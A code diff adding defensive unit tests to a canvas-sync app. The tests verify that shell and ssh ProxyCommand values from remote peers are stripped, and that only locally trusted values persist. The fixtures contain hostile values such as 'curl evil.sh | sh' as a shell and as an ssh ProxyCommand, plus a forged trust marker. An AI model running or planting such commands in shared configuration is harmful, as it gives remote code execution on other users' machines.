@@ -4,6 +4,8 @@ import {
   applyLocalNodeExec,
   localNodeExec,
   safeSessionProgram,
+  sanitizeInboundMutation,
+  sanitizeInboundNode,
   stripSharedNodeExec
 } from './node-exec'
 
@@ -72,7 +74,7 @@ describe('localNodeExec / applyLocalNodeExec', () => {
   it("round-trips the local user's own custom shell and ssh args through the machine-local index", () => {
     const live = [
       node({ id: 'n1', shell: '/bin/zsh' }),
-      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h' } })
+      node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true } })
     ]
     const local = localNodeExec(live)
     expect(local).toEqual({
@@ -112,5 +114,98 @@ describe('localNodeExec / applyLocalNodeExec', () => {
 
   it('returns undefined when there is nothing machine-local to keep', () => {
     expect(localNodeExec([node()])).toBeUndefined()
+  })
+})
+
+// C2: the disk boundary was worthless on its own. A canvas-sync peer's mutation is applied
+// VERBATIM (isCanvasMutation validates only id/position/size), and the next save harvests whatever
+// is now in the live nodes into workspace.json — the MACHINE-LOCAL, "trusted" store — from which it
+// is re-attached on every load, for ever: the peer can leave, be revoked, the app can restart, and
+// their `shell` / `-o ProxyCommand=…` still runs. So the wire is a trust boundary too.
+describe('sanitizeInboundNode / sanitizeInboundMutation (canvas-sync peers)', () => {
+  it('drops shell and ssh.extraArgs from a peer node, keeping everything else', () => {
+    const peer = node({
+      id: 'n1',
+      title: 'theirs',
+      shell: 'curl evil.sh | sh',
+      ssh: { host: 'h', user: 'u', port: 2222, extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
+    })
+    const clean = sanitizeInboundNode(peer)
+    expect(clean.shell).toBeUndefined()
+    expect(clean.ssh?.extraArgs).toBeUndefined()
+    expect(clean.ssh?.host).toBe('h')
+    expect(clean.ssh?.port).toBe(2222)
+    expect(clean.title).toBe('theirs')
+  })
+
+  it('a peer cannot forge the provenance marker itself', () => {
+    const peer = node({
+      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true }
+    })
+    const clean = sanitizeInboundNode(peer)
+    expect(clean.ssh?.extraArgs).toBeUndefined()
+    expect(clean.ssh?.execTrusted).toBeUndefined()
+  })
+
+  it('sanitizes an upsert mutation and preserves its stamps; a remove passes through', () => {
+    const m = {
+      op: 'upsert' as const,
+      node: node({ id: 'n1', shell: 'evil.sh' }),
+      src: 'cv-abc',
+      seq: 7
+    }
+    const clean = sanitizeInboundMutation(m)
+    expect(clean.node.shell).toBeUndefined()
+    expect(clean.src).toBe('cv-abc')
+    expect(clean.seq).toBe(7)
+    const rm = { op: 'remove' as const, id: 'n1' }
+    expect(sanitizeInboundMutation(rm)).toBe(rm)
+  })
+
+  it('leaves a clean node alone by reference (no needless re-render / re-publish)', () => {
+    const clean = node({ id: 'n1' })
+    expect(sanitizeInboundNode(clean)).toBe(clean)
+  })
+})
+
+// The provenance rule for the trusted store: an exec-enabling value gets in only if a LOCAL
+// producer set it. (The inbound strip above is the primary guard; this is the one that decides what
+// may be BLESSED as this machine's own, so it must not take a laundered value's word for it.)
+describe('localNodeExec provenance', () => {
+  it('stores an exec-enabling ssh value only when it is execTrusted', () => {
+    const laundered = node({
+      id: 'n1',
+      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' }
+    })
+    expect(localNodeExec([laundered])).toBeUndefined()
+
+    const mine = node({
+      id: 'n1',
+      ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true }
+    })
+    expect(localNodeExec([mine])).toEqual({
+      n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' }
+    })
+  })
+
+  it('stores harmless ssh args regardless of provenance (nothing legitimate is lost)', () => {
+    const n = node({ id: 'n1', ssh: { host: 'h', user: 'u', extraArgs: '-A -J jump.example' } })
+    expect(localNodeExec([n])).toEqual({ n1: { sshExtraArgs: '-A -J jump.example' } })
+  })
+
+  it('never blesses a shell the exec site would refuse anyway', () => {
+    expect(localNodeExec([node({ id: 'n1', shell: 'curl evil.sh | sh' })])).toBeUndefined()
+    expect(localNodeExec([node({ id: 'n1', shell: '/bin/zsh' })])).toEqual({
+      n1: { shell: '/bin/zsh' }
+    })
+  })
+
+  it('applyLocalNodeExec marks what it re-attaches as this machine\'s own', () => {
+    const loaded = applyLocalNodeExec(
+      [node({ id: 'n1', ssh: { host: 'h', user: 'u' } })],
+      { n1: { sshExtraArgs: '-o ProxyCommand=corp-proxy %h' } }
+    )
+    expect(loaded[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
+    expect(loaded[0].ssh?.execTrusted).toBe(true) // → the exec site honors it
   })
 })
